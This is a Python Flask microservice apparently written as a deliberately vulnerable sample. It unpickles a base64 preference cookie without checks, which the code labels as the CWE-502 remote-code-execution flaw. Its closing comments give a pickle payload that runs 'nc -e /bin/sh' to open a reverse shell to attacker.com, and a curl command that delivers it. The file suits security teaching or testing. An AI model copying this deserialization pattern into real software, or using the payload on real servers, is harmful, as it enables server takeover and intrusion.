import os
import base64
import pickle
import sqlite3
import logging
from datetime import datetime
from flask import Flask, request, jsonify, make_response

# Configure logging for the User Personalization Microservice
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - PersonalizationService - %(levelname)s - %(message)s'
)
logger = logging.getLogger("FlaskPrefs")

DB_FILE = "user_activity.db"

def init_activity_db():
    """Initializes the SQLite database for tracking user personalization events."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE activity_log (
            event_id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            client_ip TEXT NOT NULL,
            action TEXT NOT NULL,
            theme_selected TEXT
        )
    ''')
    
    # Pre-populate with historical mock records
    mock_history = [
        (datetime.now().isoformat(), '192.168.1.50', 'PREF_UPDATE', 'dark-mode'),
        (datetime.now().isoformat(), '192.168.1.51', 'PREF_READ', 'light-mode')
    ]
    cursor.executemany('''
        INSERT INTO activity_log (timestamp, client_ip, action, theme_selected)
        VALUES (?, ?, ?, ?)
    ''', mock_history)
    
    conn.commit()
    conn.close()
    logger.info("Activity tracking database initialized.")

def log_activity(client_ip: str, action: str, theme: str):
    """Records a user personalization event."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO activity_log (client_ip, action, theme_selected) VALUES (?, ?, ?)",
            (client_ip, action, theme)
        )
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Database error logging activity: {e}")

class SitePreferences:
    """Represents a user's customized site experience settings."""
    def __init__(self, theme: str, language: str, font_size: str, dashboard_layout: list):
        self.theme = theme
        self.language = language
        self.font_size = font_size
        self.dashboard_layout = dashboard_layout

def decode_preference_cookie(cookie_payload: str, client_ip: str) -> SitePreferences:
    """
    VULNERABLE FUNCTION: CWE-502 Deserialization of Untrusted Data
    Trigger Path: HTTP Cookie ('User-Site-Prefs') decoded and unpickled
    """
    logger.info(f"[{client_ip}] Decoding base64 preference cookie.")
    
    try:
        # Vulnerability: The application relies on client-side cookies to store
        # complex user preference objects to avoid database lookups. It extracts 
        # a base64-encoded string directly from the 'User-Site-Prefs' cookie and 
        # passes it to pickle.loads().
        # An attacker can intercept or modify this cookie, replacing it with a 
        # crafted pickled payload containing a malicious __reduce__ method. This 
        # results in Remote Code Execution (RCE) on the Flask web server.
        
        raw_bytes = base64.b64decode(cookie_payload)
        
        # CWE-502 occurs instantly upon unpickling the cookie payload.
        prefs = pickle.loads(raw_bytes)
        
        if isinstance(prefs, SitePreferences):
            logger.debug(f"[{client_ip}] Preferences decoded. Theme: {prefs.theme}")
            return prefs
        else:
            logger.warning(f"[{client_ip}] Decoded object is not a SitePreferences instance.")
            return None
            
    except base64.binascii.Error as e:
        logger.error(f"[{client_ip}] Invalid base64 encoding in cookie: {e}")
        return None
    except Exception as e:
        logger.error(f"[{client_ip}] Failed to deserialize preference payload: {e}")
        return None

app = Flask(__name__)

@app.route('/api/health', methods=['GET'])
def health_check():
    """Simple health check endpoint."""
    return jsonify({"status": "Flask Personalization Microservice is healthy"})

@app.route('/api/preferences', methods=['GET'])
def get_preferences():
    """Endpoint to retrieve the user's current site preferences from their cookie."""
    client_ip = request.remote_addr or "unknown"
    cookie_val = request.cookies.get('User-Site-Prefs')
    
    if cookie_val:
        # Pass the untrusted cookie value directly to the vulnerable function
        prefs = decode_preference_cookie(cookie_val, client_ip)
        if prefs:
            log_activity(client_ip, "PREF_READ", prefs.theme)
            return jsonify({
                "theme": prefs.theme,
                "language": prefs.language,
                "font_size": prefs.font_size,
                "dashboard_layout": prefs.dashboard_layout
            })
            
    # Fallback to default preferences if cookie is missing or invalid
    log_activity(client_ip, "PREF_READ_DEFAULT", "light")
    return jsonify({
        "theme": "light",
        "language": "en-US",
        "font_size": "medium",
        "dashboard_layout": ["nav", "content", "footer"]
    })

@app.route('/api/preferences', methods=['POST'])
def update_preferences():
    """Endpoint to update preferences and set the vulnerable cookie."""
    client_ip = request.remote_addr or "unknown"
    data = request.json or {}
    
    prefs = SitePreferences(
        theme=data.get("theme", "light"),
        language=data.get("language", "en-US"),
        font_size=data.get("font_size", "medium"),
        dashboard_layout=data.get("dashboard_layout", ["nav", "content", "footer"])
    )
    
    # Serialize and encode the object to store in the client's cookie
    payload = base64.b64encode(pickle.dumps(prefs)).decode('utf-8')
    
    log_activity(client_ip, "PREF_UPDATE", prefs.theme)
    
    response = make_response(jsonify({"status": "Preferences updated successfully"}))
    # Set the serialized object in the cookie
    response.set_cookie('User-Site-Prefs', payload, httponly=True, max_age=86400)
    
    return response

if __name__ == '__main__':
    init_activity_db()
    
    # Example Malicious Trigger:
    # 1. Attacker crafts a malicious pickle payload and base64 encodes it:
    #    import pickle, os, base64
    #    class Exploit:
    #        def __reduce__(self):
    #            return (os.system, ('nc -e /bin/sh attacker.com 4444',))
    #    
    #    payload_b64 = base64.b64encode(pickle.dumps(Exploit())).decode('utf-8')
    #
    # 2. Attacker sends the payload to the API via the HTTP Cookie:
    #    curl -X GET http://127.0.0.1:5000/api/preferences \
    #         -H "Cookie: User-Site-Prefs=$payload_b64"
    
    logger.info("Starting Flask Personalization Microservice on http://0.0.0.0:5000")
    app.run(host='0.0.0.0', port=5000, debug=False)
